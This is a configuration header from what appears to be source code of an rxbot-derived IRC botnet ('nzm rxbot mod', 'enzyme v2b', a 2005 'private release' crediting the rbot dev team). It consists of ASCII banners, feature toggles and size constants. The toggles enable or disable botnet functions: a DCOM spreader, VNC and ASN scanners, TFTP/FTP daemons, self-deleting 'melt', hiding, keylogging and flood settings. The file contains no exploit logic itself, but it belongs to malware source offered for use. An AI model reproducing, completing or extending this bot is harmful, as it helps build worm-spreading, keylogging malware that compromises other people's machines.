/*
 XXXXX   XXXXXX   XXXXXXX   XXX XXX XXXXXXX   XXXXX
XXX XXX  XXX XXX  XX  XXX   XXX XXX XXXXXXXX XXX XXX
XXXXXXX  XXX XXX     XXX    XXX XXX XXXXXXXX XXXXXXX
XXX      XXX XXX   XXX      XXX XXX XXXXXXXX XXX
XXX XXX  XXX XXX  XXX  XX    XXXXX  XXXXXXXX XXX XXX
 XXXXX   XXX XXX  XXXXXXX      XXX  XXX  XXX  XXXXX
                              XXX               .v2b
                           XXXXX
 ____________________
+ enzyme ..v2b       +
| nzm rxbot mod ..   |
| private release *  |
| 04.26.05	         |
+____________________+
		      ____________________
 		     + code from ..       +
		     | bcuzz              |
		     | stoney  		      |
		     | x-lock	          |
		     | ionix              |
		     | phatty		      |
		     | nesespray	      |
		     | rbot dev team 	  |
		     +____________________+
 ____________________
+ read ..            +
| the docs           |
| don't ..           |
| mass distribute    |
+____________________+

*/

// #define NO_NETINFO    // disables Network info function
// #define NO_SYSINFO    // disables System info function
// #define NO_PROCESS    // disables Process control (ps/kill) functions
// #define NO_DOWNLOAD   // disables Downloading/updating functions
// #define NO_CONNCHECK  // disables Check for internet connection
// #define NO_BOTVERSION // disables Bot version
// #define NO_TFTP       // disables TFTP daemon functions
// #define NO_FTPD		 // disables FTP daemon functions
// #define NO_WILDCARD   // disables Wildcard authost
// #define NO_DCOM       // disables DCOM Spreader
// #define NO_EHANDLER   // disables Exception Handler function
#define NO_CRASH         // disables Crash function
// #define NO_MIRCNICK   // disables mIRC nick prefix
// #define NO_MODEONCONN // disables setting user modes on-connect
#define NO_REGISTRY      // disables Registry Monitor on startup function
// #define NO_MELT       // disables file melt (delete) on start-up
#define DEBUG_CRYPT      // enables bot string dump in order to try to debug the Crypt() function
// #define DEBUG_LOGGING // enables protocol dumping to a log file for testing purposes
// #define DEBUG_CONSOLE // enables debugging console for stdout/stderr for testing purposes
// #define AUTO_KEYLOG   // enables automatically Keylogging. // FIX ME: Not working yet, waiting on new code.
// #define NO_ASN        //Disable ASN
// #define NO_VNCSCANNER

#undef NO_HIDE

#define IRCLINE			512
#define MAXTHREADS		500
#define MAXALIASES		16
#define LOGSIZE			128
#define LOGLINE			128
#define MAXLOGINS		2
#define MAX_LINES		500
#define MAXSCANTHRD		128
#define MAXSCANTIME		800
#define MAXHOSTNAME		255
#define BLOCKSIZE		512
#define FLOOD_DELAY		2000
#define MAXSTRLEN		500
#define MAXNICKLEN		30
#define MAXPINGSIZE		65500
#define MAXTOKENS		32
#define MAX_IP			16
#define MAX_HOSTNAME	256

#define AMPM(x) ((x>12)?("PM"):("AM"))
#define HOUR(x) ((x>12)?(x-12):(x))

#define fFD_ISSET(fd, set) __fWSAFDIsSet((SOCKET)(fd), (fd_set FAR *)(set))

#define addpredefinedaliases()
